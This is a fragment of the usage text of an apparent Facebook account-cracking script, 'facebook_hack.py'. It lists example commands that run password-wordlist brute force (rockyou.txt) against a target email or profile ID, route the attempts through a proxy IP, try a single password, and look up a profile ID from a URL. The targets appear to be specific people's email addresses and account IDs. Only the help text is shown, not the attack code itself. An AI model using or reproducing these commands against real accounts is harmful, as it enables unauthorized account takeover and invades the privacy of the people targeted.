...
Examples:
        |
     |--------
     | python facebook_hack.py -t Devi@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python facebook_hack.py -t 100036118653131 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python facebook_hack.py -t Devi@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python facebook_hack.py -t Devi@gmail.com -s 1234567
     |--------
     | python facebook_hack.py -g https://www.facebook.com/profile.php?id=100036118653131
     |--------
""")
